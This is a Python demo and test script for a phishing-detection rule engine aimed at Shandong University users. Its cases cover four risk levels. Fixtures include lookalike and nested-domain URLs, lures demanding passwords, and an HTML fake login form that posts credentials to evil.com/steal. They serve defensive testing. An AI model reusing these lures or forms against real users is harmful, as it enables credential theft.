"""钓鱼检测演示脚本 — 4 组演示案例覆盖 4 个风险等级.

用法:
    python -m phishing_rule_detector.demo
"""

from __future__ import annotations

import json
import sys
from datetime import datetime
from pathlib import Path
from typing import Any

from phishing_rule_detector.detector import detect

_ARTIFACTS_DIR = Path(__file__).resolve().parent.parent / "artifacts"
_DEMO_JSON_PATH = _ARTIFACTS_DIR / "demo_cases.json"


def _configure_piped_utf8() -> None:
    """Use UTF-8 for redirected CLI output while preserving interactive consoles."""
    for stream in (sys.stdout, sys.stderr):
        if not stream.isatty() and hasattr(stream, "reconfigure"):
            stream.reconfigure(encoding="utf-8", errors="replace")

# ── 4 组演示案例 ──

DEMO_GROUPS: dict[str, list[dict[str, Any]]] = {
    "Group A: 正常内容 (low)": [
        {
            "id": "DEMO-A1",
            "title": "学校官方选课通知",
            "description": "正常学校邮件，官方域名+官方发件人，应评为 low",
            "expected_level": "low",
            "expected_rule_ids": [],
            "call": lambda: detect(
                input_text="您好，本学期选课系统将于 9 月 15 日开放，请登录 https://sdu.edu.cn/course 查看课程安排。",
                input_type="email",
                context={"sender": "registrar@sdu.edu.cn"},
            ),
        },
        {
            "id": "DEMO-A2",
            "title": "学校官网访问",
            "description": "直接访问学校官网 URL，应评为 low",
            "expected_level": "low",
            "expected_rule_ids": [],
            "call": lambda: detect(
                input_text="https://sdu.edu.cn/admissions/2025/schedule",
                input_type="url",
            ),
        },
        {
            "id": "DEMO-A3",
            "title": "日常课程通知",
            "description": "普通课程调整通知，无链接无附件，应评为 low",
            "expected_level": "low",
            "expected_rule_ids": [],
            "call": lambda: detect(
                input_text="今天的课程改到线上，请大家准时参加。会议链接稍后发送。",
                input_type="text",
            ),
        },
        {
            "id": "DEMO-A4",
            "title": "学校 CAS 统一认证",
            "description": "学校官方 CAS 登录页面，应评为 low",
            "expected_level": "low",
            "expected_rule_ids": [],
            "call": lambda: detect(
                input_text="https://pass.sdu.edu.cn/cas/login?service=https://sdu.edu.cn/portal",
                input_type="url",
            ),
        },
    ],
    "Group B: 可疑信号 (medium)": [
        {
            "id": "DEMO-B1",
            "title": "时间压力+账号停用威胁",
            "description": "短信包含具体时间限制与账号停用威胁，应评为 medium",
            "expected_level": "medium",
            "expected_rule_ids": ["TIME_LIMIT_PRESSURE", "ACCOUNT_DISABLE_THREAT"],
            "call": lambda: detect(
                input_text="请在12小时内完成验证，否则账号将被停用",
                input_type="sms",
            ),
        },
        {
            "id": "DEMO-B2",
            "title": "紧急验证+时间限制",
            "description": "邮件包含紧急验证和时间限制关键词，应评为 medium（URGENT_VERIFY_WORDING 被 TIME_LIMIT_PRESSURE 抑制）",
            "expected_level": "medium",
            "expected_rule_ids": ["TIME_LIMIT_PRESSURE"],
            "call": lambda: detect(
                input_text=(
                    "【重要通知】您的统一认证账号需要在12小时内立即验证，"
                    "请尽快点击 https://verify-example.com/auth 完成认证，"
                    "今日截止，否则将影响正常使用。"
                ),
                input_type="email",
                context={"sender": "notice@external-service.com"},
            ),
        },
    ],
    "Group C: 高危钓鱼 (high)": [
        {
            "id": "DEMO-C1",
            "title": "仿冒域名钓鱼",
            "description": "邮件使用仿冒官方域名+要求输入密码，应评为 high",
            "expected_level": "high",
            "expected_rule_ids": ["DOMAIN_SIMILAR_TO_OFFICIAL"],
            "call": lambda: detect(
                input_text=(
                    "【紧急通知】您的账号出现异常登录，请立即点击 "
                    "https://sdu-edu.cn/verify 验证身份，输入密码确认。"
                ),
                input_type="email",
                context={"sender": "security@sdu-edu.cn"},
            ),
        },
        {
            "id": "DEMO-C2",
            "title": "发件人冒充+凭据请求",
            "description": "非官方邮箱冒充学校部门并要求提交密码，应评为 high",
            "expected_level": "high",
            "expected_rule_ids": ["EMAIL_SENDER_IMPERSONATION", "CREDENTIAL_REQUEST_TEXT"],
            "call": lambda: detect(
                input_text=(
                    "您好，这里是山东大学信息技术中心，"
                    "请点击链接 https://evil.com/verify 验证您的账号，"
                    "按提示提交密码以完成身份确认。"
                ),
                input_type="email",
                context={"sender": "fake@evil.com"},
            ),
        },
        {
            "id": "DEMO-C3",
            "title": "嵌套官方域名 URL",
            "description": "URL 中以路径方式嵌套官方域名诱骗用户，应评为 high",
            "expected_level": "high",
            "expected_rule_ids": ["URL_NESTED_OFFICIAL_DOMAIN"],
            "call": lambda: detect(
                input_text="https://sdu.edu.cn.evil.com/login",
                input_type="url",
            ),
        },
    ],
    "Group D: 严重锁定 (critical)": [
        {
            "id": "DEMO-D1",
            "title": "仿冒域名+密码表单",
            "description": (
                "仿冒域名+密码输入框+学号输入框，"
                "identity+credential 两组 qualified high → critical_lock"
            ),
            "expected_level": "critical",
            "expected_rule_ids": ["DOMAIN_SIMILAR_TO_OFFICIAL", "PASSWORD_FORM_UNTRUSTED_TARGET"],
            "call": lambda: detect(
                input_text=(
                    "<html><body>"
                    "<h1>山东大学统一认证</h1>"
                    "<form action='https://evil.com/steal'>"
                    "<input type='password' name='pwd' placeholder='请输入密码'>"
                    "<input name='student_id' placeholder='请输入学号'>"
                    "</form>"
                    "</body></html>"
                ),
                input_type="html",
                base_url="https://sdu-edu.cn/login",
            ),
        },
    ],
}


def _fmt_level(level: str) -> str:
    icons = {"low": "[LOW]", "medium": "[MED]", "high": "[HIGH]", "critical": "[CRIT]"}
    return f"{icons.get(level, '[???]')} {level.upper()}"


def _evaluate_demo_case(case: dict[str, Any]) -> dict[str, Any]:
    """运行一个演示案例并返回结构化结果."""
    result = case["call"]()
    expected_level = case.get("expected_level", "low")
    expected_rules = case.get("expected_rule_ids", [])

    passed = True
    failures: list[str] = []

    if not result["success"]:
        passed = False
        failures.append("detect() 返回 success=false")

    risk = result.get("risk", {})
    actual_level = risk.get("level", "error") if result["success"] else "error"
    actual_critical_lock = risk.get("critical_lock", False) if result["success"] else False
    evidence_rules = sorted({e["rule_id"] for e in result.get("evidence", [])})

    # 等级必须匹配（不是 >=，是 ==）
    if actual_level != expected_level:
        passed = False
        failures.append(f"等级不匹配：期望={expected_level}，实际={actual_level}")

    # 如果期望 critical，必须 critical_lock=true
    if expected_level == "critical":
        if not actual_critical_lock:
            passed = False
            failures.append("期望 critical_lock=true，实际=false")

    # 必现规则
    for rid in expected_rules:
        if rid not in evidence_rules:
            passed = False
            failures.append(f"缺少期望规则 {rid}")

    return {
        "id": case["id"],
        "title": case["title"],
        "description": case["description"],
        "expected_level": expected_level,
        "actual_level": actual_level,
        "passed": passed,
        "success": result["success"],
        "level": actual_level,
        "score": risk.get("score", 0) if result["success"] else 0,
        "raw_score": risk.get("raw_score", 0) if result["success"] else 0,
        "confidence": risk.get("confidence", 0.0) if result["success"] else 0.0,
        "critical_lock": actual_critical_lock,
        "evidence_count": len(result.get("evidence", [])),
        "evidence_rules": evidence_rules,
        "trace_id": result.get("trace_id", ""),
        "duration_ms": result.get("duration_ms", 0),
        "warnings": result.get("warnings", []),
        "failures": failures,
    }


def run_demo(silent: bool = False) -> list[dict[str, Any]]:
    """运行所有演示案例，返回结构化结果列表."""
    all_grouped: list[dict[str, Any]] = []

    for group_name, cases in DEMO_GROUPS.items():
        group_results = [_evaluate_demo_case(c) for c in cases]
        all_grouped.append({"group": group_name, "cases": group_results})

    if not silent:
        _print_demo(all_grouped)

    return _flatten(all_grouped)


def _flatten(grouped: list[dict[str, Any]]) -> list[dict[str, Any]]:
    flat: list[dict[str, Any]] = []
    for g in grouped:
        flat.extend(g["cases"])
    return flat


def _print_demo(grouped: list[dict[str, Any]]) -> None:
    print("=" * 72)
    print("  钓鱼规则引擎 — 演示案例")
    print("=" * 72)

    total_passed = 0
    total_cases = 0

    for group in grouped:
        group_name = group["group"]
        cases = group["cases"]
        print(f"\n{'─' * 72}")
        print(f"  {group_name}")
        print(f"{'─' * 72}")

        for case in cases:
            total_cases += 1
            status = "PASS" if case["passed"] else "FAIL"
            if case["passed"]:
                total_passed += 1

            print(f"\n  [{case['id']}] {status} | expected={case['expected_level']} actual={case['actual_level']}")
            print(f"  标题: {case['title']}")
            print(f"  说明: {case['description']}")
            print(f"  分数: {case['score']} (raw={case['raw_score']})")
            print(f"  置信度: {case['confidence']:.2%}")
            if case["critical_lock"]:
                print("  [LOCK] critical_lock: True")
            print(f"  证据数: {case['evidence_count']} 条")
            if case["evidence_rules"]:
                print(f"  触发规则: {', '.join(case['evidence_rules'])}")
            if case["failures"]:
                for f_msg in case["failures"]:
                    print(f"  -> 失败原因: {f_msg}")
            if case["warnings"]:
                print(f"  警告: {', '.join(case['warnings'])}")
            print(f"  trace_id: {case['trace_id']} | 耗时: {case['duration_ms']}ms")

    print(f"\n{'=' * 72}")
    print(f"  演示完成: {total_passed}/{total_cases} 例通过")
    print(f"{'=' * 72}")


def export_demo_json(
    path: str | Path | None = None,
    results: list[dict[str, Any]] | None = None,
) -> str:
    """导出演示结果为 JSON 文件."""
    p = Path(path) if path else _DEMO_JSON_PATH
    p.parent.mkdir(parents=True, exist_ok=True)

    if results is None:
        results = run_demo(silent=True)
    groups_out = []
    for group_name, configured_cases in DEMO_GROUPS.items():
        case_ids = {case["id"] for case in configured_cases}
        group_cases = [case for case in results if case["id"] in case_ids]
        groups_out.append({"group": group_name, "cases": group_cases})

    output = {
        "title": "钓鱼规则引擎 — 演示案例",
        "generated_at": datetime.now().astimezone().isoformat(timespec="seconds"),
        "rule_version": "3.0.0",
        "groups": groups_out,
    }

    with open(p, "w", encoding="utf-8") as f:
        json.dump(output, f, ensure_ascii=False, indent=2)

    return str(p)


def main(argv: list[str] | None = None) -> int:
    _configure_piped_utf8()
    if argv is None:
        argv = sys.argv[1:]

    export_json_flag = "--json" in argv or "--export" in argv

    try:
        results = run_demo(silent=export_json_flag)
        if export_json_flag:
            path = export_demo_json(results=results)
            print(f"演示结果已导出: {path}")

        # 退出码：全部通过=0，任一失败=1
        all_passed = all(c["passed"] for c in results)
        if not all_passed:
            failed = [c["id"] for c in results if not c["passed"]]
            print(f"失败案例: {failed}", file=sys.stderr)

        return 0 if all_passed else 1
    except Exception as e:
        print(f"演示运行失败: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
